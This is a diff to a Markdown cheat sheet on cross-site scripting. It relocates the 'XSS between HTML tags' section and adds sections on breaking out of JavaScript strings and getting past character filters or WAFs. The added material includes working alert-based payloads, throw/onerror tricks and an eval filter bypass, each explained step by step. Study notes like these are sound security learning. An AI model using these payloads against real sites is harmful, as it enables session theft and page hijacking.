@@ -5,7 +5,6 @@ Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in
 ### Type of Xss
 
 - [verify XSS](#verify-xss)
-- [XSS between HTML tags]
 - [stored XSS](#stored-xss)
 - [reflected XSS](#reflected-xss)
     - [find reflected XSS](#how-to-find-and-test-for-reflected-xss-vulnerabilities)
@@ -17,6 +16,12 @@ Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in
             - [attr](#attr)
             - [selector function $()](#selector-func)
     - [Dom based Angular](#dom-xss-angularjs)
+- [XSS between HTML tags](#xss-between-html-tags)
+- [Xss into Javascript](#xss-into-javascript)
+    - [breaking out of js string](#breaking-out-of-a-javascript-string)
+    - [bypass restricted char](#bypass-restricted-char)
+            - [explaination](#explaination)
+            - [docu](#docu)
 - [Prevent XSS attack](#prevent-xss)
 
 ## Verify XSS
@@ -25,16 +30,6 @@ Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in
 <script>alert(document.cookie)</script>
 ```
 
-## XSS between HTML tags
-
-When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.
-
-Some useful ways of executing JavaScript are:
-
-```html
-<script>alert(document.domain)</script>
-<img src=1 onerror=alert(1)>
-```
 
 ## Stored Xss
 
@@ -208,6 +203,100 @@ Nice we created a malicious function, but we need to call it:
 ```
 
 Extra add of `()` at the end of the anonymous function we did created call it instantly.
+
+## XSS between HTML tags
+
+When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.
+
+Some useful ways of executing JavaScript are:
+
+```html
+<script>alert(document.domain)</script>
+<img src=1 onerror=alert(1)>
+```
+
+## Xss into Javascript
+
+### Breaking out of a JavaScript string
+
+In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.
+
+Some useful ways of breaking out of a string literal are:
+
+```
+'-alert(document.domain)-'
+';alert(document.domain)//
+</javascript>
+```
+### bypass restricted char
+
+Some websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website.
+
+One way of doing this is to use the throw statement with an exception handler:
+
+- onerror is trigger by a exception and the throw statement allows you to create a custom exception containing an expression which is sent to the onerror handler.
+
+some payloads:
+
+```js
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>{onerror=eval}throw'=alert\x281337\x29'</script>
+// The string sent to eval is "Uncaught=alert(1337)"
+
+// this payload work inside a funciont by giving it dead parameters
+<script>, x=x=>{throw onerror=alert,1337},toString=x,window+''</script>
+// this one got explained under
+```
+
+:warning: If ` ` is blocked try tabulation or `/**/`
+
+#### Explaination:
+
+`<script>, x=x=>{throw onerror=alert,1337},toString=x,window+''</script>`
+
+:warning: This payload work by giving dead arg to a function, because dead arg execute expression:
+
+```js
+let cal = (a, b) => {
+    return a +b;
+}
+cal(1,3) // equal 4
+cal(1,3,3,6,3) // still equal 4
+let my_var = 5
+cal(1,3,3,my_var=10) // still return 4
+console.log(my_var) //print 10
+```
+
+First : `throw onerror=alert,1337`
+
+`throw 1,2,3` will throw 3. but it actually execute others value on the list: 
+
+- `throw onerror=alert, 3` : still throw 3 but overwrite the value of onerror to alert function and call it with throwed value
+
+Then : `x=x=>{}` what does it mean ?
+
+it is an anonymous function:
+
+```js
+//similar to that
+let x = (x) => {
+
+}
+//actualy we dont need (x) parameter but, let say () are block u need to find a way to syntaxely write ur function
+let x=x=>{}
+let x=()=>{}
+```
+
+So `x=x=>{throw onerror=alert,1337}` call a defined a function which throw alert(1337), now we need to call it: `toString=x,window+''`
+
+- it assign toString method to our x function, so toString now call x.
+- it try to concat window + '' (an empty array) so the method toString is call and boom, it call our x function
+
+#### Docu
+
+- [XSS without parentheses](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
+
 
 ## Prevent XSS
 
